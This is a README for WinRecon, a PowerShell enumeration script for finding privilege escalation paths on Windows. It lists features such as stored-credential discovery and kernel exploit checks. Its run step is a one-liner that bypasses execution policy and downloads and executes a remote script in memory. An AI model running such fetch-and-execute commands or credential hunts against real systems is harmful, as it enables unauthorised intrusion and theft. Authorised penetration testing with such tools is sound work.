# ![WinRecon Logo](./WinRecon.png)

## WinRecon

**WinRecon** is a PowerShell-based enumeration script designed to gather essential system information needed to identify potential privilege escalation opportunities on Windows machines. It automates the process of collecting valuable data to assist penetration testers, red teams, and system administrators in finding weaknesses that could lead to elevation of privileges.

---

## Features

### User and Group Enumeration
- **Local User Accounts**: Lists all local user accounts and highlights administrative accounts.
- **Group Memberships**: Displays detailed information about group memberships.
- **Domain Information**: Extracts information about domain users and domain controllers when applicable.

### Credential Discovery
- **Stored Credentials**: Identifies credentials stored in the system, such as in the registry or configuration files.
- **Password Policies**: Retrieves domain and local password policies to highlight weak configurations.

### Service and Task Enumeration
- **Services**: Lists services with details like privileges, paths, and configurations.
- **Scheduled Tasks**: Enumerates scheduled tasks to identify potential execution vectors.

### Privilege Escalation Insights
- **System Information**: Extracts OS details, patches, and configurations.
- **Misconfigurations**: Identifies potential misconfigurations, such as writable directories or vulnerable registry keys.
- **Kernel Exploits**: Checks for unpatched kernel vulnerabilities based on OS version.

### File and Directory Insights
- **Sensitive Files**: Searches for files containing potential credentials or sensitive data.
- **Writable Directories**: Lists directories writable by non-privileged users.

### Network Configuration
- **Network Interfaces**: Displays information about active network interfaces.
- **Listening Ports**: Identifies listening ports and associated services.

### Logging and Reporting
- **Comprehensive Logging**: Logs findings to a structured and easily readable format.
- **Export Options**: Provides options to save results for later analysis.

---

## How to Run

1. **For full AD options you will need to download PsLoggedon.exe and PowerView.ps1**.
2. Run the script with the following command:
   ```powershell
   powershell -ep Bypass -Command 'IEX(IWR http://<LocalHost>/winrecon.ps1 -UseBasicParsing)'
   ```



